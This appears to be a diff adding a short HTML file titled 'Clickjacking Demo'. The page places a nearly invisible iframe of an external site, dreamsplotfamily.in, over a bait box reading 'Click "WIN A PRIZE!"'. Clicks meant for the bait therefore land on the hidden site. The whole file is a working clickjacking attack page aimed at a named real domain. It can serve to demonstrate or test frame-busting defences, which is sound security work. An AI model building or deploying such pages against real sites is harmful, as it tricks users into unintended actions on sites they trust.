@@ -1,0 +1,35 @@
+<!-- filename: index.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Clickjacking Demo</title>
+    <style>
+      iframe {
+        position: absolute;
+        top: 50px;
+        left: 50px;
+        width: 800px;
+        height: 600px;
+        opacity: 0.1; /* Makes it nearly invisible */
+        z-index: 2;
+      }
+
+      #bait {
+        position: absolute;
+        top: 50px;
+        left: 50px;
+        width: 800px;
+        height: 600px;
+        background-color: #ccc;
+        z-index: 1;
+        text-align: center;
+        padding-top: 280px;
+        font-size: 24px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="bait">Click "WIN A PRIZE!"</div>
+    <iframe src="https://dreamsplotfamily.in"></iframe>
+  </body>
+</html>
